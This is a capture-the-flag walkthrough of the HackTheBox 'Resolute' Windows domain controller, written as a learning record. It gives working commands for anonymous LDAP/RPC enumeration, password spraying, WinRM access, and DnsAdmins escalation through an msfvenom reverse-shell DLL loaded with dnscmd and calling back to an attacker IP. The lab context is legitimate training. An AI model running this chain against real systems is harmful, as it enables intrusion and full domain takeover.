---
title: "HTB Resolute Walkthrough"
machine_name: "Resolute"
difficulty: "Medium"
os: "Windows"
date_completed: "2025-04-25"
techniques: ["Active Directory", "RPC Enumeration", "LDAP Anonymous Bind", "Password Spraying", "WinRM", "DnsAdmins Exploitation", "DLL Injection", "PowerShell Transcripts"]
box_ip: "10.10.10.169"
machine_rank: "#9183"
htb_completion_image: "resolute.webp"
---

![HTB Resolute Completion](/imgs/walkthroughs/resolute.webp)

In this walkthrough, I'll guide you through my exploitation of the "Resolute" box from HackTheBox. It begins with simple anonymous bindings and culminates in a system-level compromise. The attack chain starts with RPC anonymous binding to gather user accounts, discovering credentials through LDAP anonymous binding, and confirming access via password spraying to gain initial access as user 'melanie'. From there, the path leads to uncovering a hidden PowerShell transcript directory containing the credentials for a higher-privileged user 'ryan', who belongs to the powerful DnsAdmins group. This group membership becomes our ticket to privilege escalation by allowing us to inject a malicious DLL through the DNS service, ultimately yielding SYSTEM-level access and complete domain compromise.

## Box Information
- **Platform:** HackTheBox
- **Operating System:** Windows Server 2016
- **Domain:** megabank.local
- **Computer Name:** RESOLUTE
- **FQDN:** Resolute.megabank.local
- **Date Completed:** April 24, 2025

## Initial Enumeration

As always, we begin with an nmap scan to identify available services:

```bash
nmap -p- --min-rate 5000 -vvv -n -Pn 10.10.10.169 -oG nmap/allPorts 
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49688,49907 10.10.10.169 -oN nmap/detailed
```

### Open Ports and Services

```bash
53/tcp   open  domain      DNS         # Domain Controller indicator
88/tcp   open  kerberos    Kerberos    # Confirms Active Directory environment
135/tcp  open  rpc         RPC
389/tcp  open  ldap        LDAP
445/tcp  open  smb         SMB
5985/tcp open  wsman       WinRM
47001/tcp open  winrm      WinRM
```

From this scan, we can immediately identify that we're dealing with an Active Directory domain controller, as evidenced by the DNS (53), Kerberos (88), and LDAP (389) services.

### Additional Information Gathered

- **Domain name:** megabank.local
- **Computer name:** RESOLUTE
- **FQDN:** Resolute.megabank.local

**Note on Time Skew:** There is a time skew between our attacking machine and the domain controller. This is particularly important for Kerberos-based attacks in Active Directory environments, as Kerberos authentication is highly time-sensitive with a default maximum tolerance of only 5 minutes between client and server clocks.

## User Enumeration

We can obtain a list of users using RPCClient with anonymous binding:

```bash
rpcclient -U '' -N 10.10.10.169
rpcclient $> enumdomusers
```

With this list, I shifted my aim to finding a password. SMB NULL Authentication was proving unsuccessful, so I had no access to shares. The next step was enumerating LDAP.

## Password Discovery via LDAP Anonymous Binding

LDAP anonymous binding was enabled, and I was able to extract a password with the following query:

```bash
ldapsearch -H ldap://10.10.10.169 -x -b 'DC=megabank,DC=local' -s sub | grep Pass
```

The password was found in a description field for the user marko: **Welcome123!**

## Initial Access

With a list of users and a potential password, it's time for a password spray. I tried the password "Welcome123!" against all enumerated users and found that it worked for the user **melanie**.

I checked for accessible SMB shares but found nothing interesting. Since our port scan showed WinRM was open, I tried connecting via WinRM:

```bash
evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!
```

Success! We now have a shell as melanie and can grab the user flag.

## Lateral Movement to Ryan

Once on the system, I began exploring for privilege escalation opportunities. The key finding was a hidden directory at the root level:

```bash
dir -force
```

This revealed a hidden **PSTranscripts** directory. This is not a common directory, so I decided to investigate further:

```bash
dir -force C:\PSTranscripts\*
```

Following the trail led to a PowerShell transcript file containing command history. Within this file, I discovered credentials for another user:

**ryan:Serv3r4Admin4cc123!**

These credentials belonged to the user ryan, and I was able to establish a new WinRM session as this user:

```bash
evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!
```

## Privilege Escalation via DnsAdmins Group

I knew there were no other users on the box I could pivot to except for Administrator, and knowing I was on an AD environment, it was likely the next path had something to do with a privilege the ryan user had. So I checked group memberships:

```bash
whoami /groups
```

The output revealed that ryan was a member of the **DnsAdmins** group. This is significant because members of this group can manipulate DNS settings, including loading arbitrary DLLs.

The exploitation path involves:
1. Creating a malicious DLL
2. Using dnscmd to configure the DNS server to load our DLL
3. Restarting the DNS service to execute our code

Here's how I executed this attack:

First, I created a reverse shell DLL on my attacking machine via msfvenom:

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9001 -f dll > privesc.dll
```

Then I set up an SMB server to host the file:

```bash
mkdir exploits
mv privesc.dll exploits/
sudo impacket-smbserver share $(pwd)
```

In another terminal, I started a netcat listener:

```bash
nc -lnvp 9001
```

Back in my WinRM session as ryan, I configured the DNS server to load my malicious DLL and restarted the service:

```bash
dnscmd Resolute.megabank.local /config /serverlevelplugindll \\10.10.16.3\share\privesc.dll
sc.exe stop dns
sc.exe start dns
```

As the DNS service restarted, it loaded my DLL, which executed with SYSTEM privileges and sent a reverse shell to my listener.

Success! I now had a shell as **NT AUTHORITY\SYSTEM** and could grab the root flag.

## Key Learning Points

### Technical Skills Gained
- DnsAdmin group exploitation in Active Directory via DLL injection
- Working with Windows Server 2016
- Exploiting the dnscmd binary
- DNS service management with sc.exe
- Using netexec as an alternative to crackmapexec
- Finding hidden directories with `dir -force`

### Methodology Improvements
- Quickly extracted all users using `rpcclient` and I'm now starting to memorize some of the more common enumeration commands
- Following guided walkthrough helped me not waste tons of time
- Started to copy Ippsec's way of organizing files with my own touch which is proving helpful

### Personal Growth Notes
- I need to remember to use all avenues of enumeration
- I forgot to enumerate LDAP Anonymous Binding initially, which was a necessary step
- In general I think I'm getting a better grasp of AD. I'm almost done with the HTB Academy Module 'Active Directory Enumeration & Attacks'

## Attack Chain Summary

1. Enumerate users via RPC anonymous binding
2. Discover password via LDAP anonymous binding
3. Password spray reveals melanie uses the discovered password
4. Access via WinRM as melanie
5. Discover ryan's credentials in a hidden PowerShell transcripts directory
6. Lateral movement to ryan, who is in the DnsAdmins group
7. Exploit DnsAdmins privilege by injecting a malicious DLL using the dnscmd binary
8. Gain SYSTEM privileges and capture the root flag

**Important Note:** The DnsAdmins exploitation requires restarting the DNS service, which in a real pentest environment is not ideal as it can cause service disruption.
